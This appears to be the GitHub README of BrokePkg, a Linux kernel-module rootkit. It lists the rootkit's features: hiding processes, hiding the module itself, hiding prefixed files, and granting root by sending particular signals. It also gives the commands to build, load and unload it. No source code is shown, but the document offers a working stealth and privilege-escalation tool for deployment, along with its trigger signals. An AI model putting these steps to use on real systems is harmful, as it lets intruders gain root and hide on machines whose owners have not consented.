# BrokePkg

<p align="center">
  <img src="https://i.ibb.co/2tCgDcQ/broke-without.png" width="40%">
</p>

---
Brokepkg is a LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/5.x and ARM64, with suport after kernel 5.7, without `kallsyms_lookup_name`.

## Tested on

- **Kali linux**: 5.10.0-kali3-amd64
- **Linux mint**: 4.19.0-8-amd64

## Features
- Hide/unhide any process by sending a signal 63;

<center>
<img src="https://i.ibb.co/Qk618j7/hide-process.png">
</center>

- Sending a signal 31(to any pid) makes the module become (in)visible;

<center>
<img src="https://i.ibb.co/K6vX20R/module-hidden.png">
</center>

- Sending a signal 64(to any pid) makes the given user become root;

<center>
<img src="https://i.ibb.co/Fb68jQ0/root.png">
</center>

- Files or directories starting with the PREFIX become invisible;

<center>
<img src="https://i.ibb.co/N6f5WVL/file-dir-hidden.png">
</center>

## Install
```bash
sudo apt install build-essential libncurses-dev linux-headers-$(uname -r)
git clone https://github.com/R3tr074/brokepkg
cd brokepkg
make
sudo insmod brokepkg.ko
```

## Uninstall
Remove brokepkg invisibility to uninstall him
```bash
kill -63 0
```

Then remove the module
```bash
sudo rmmod brokepkg
```
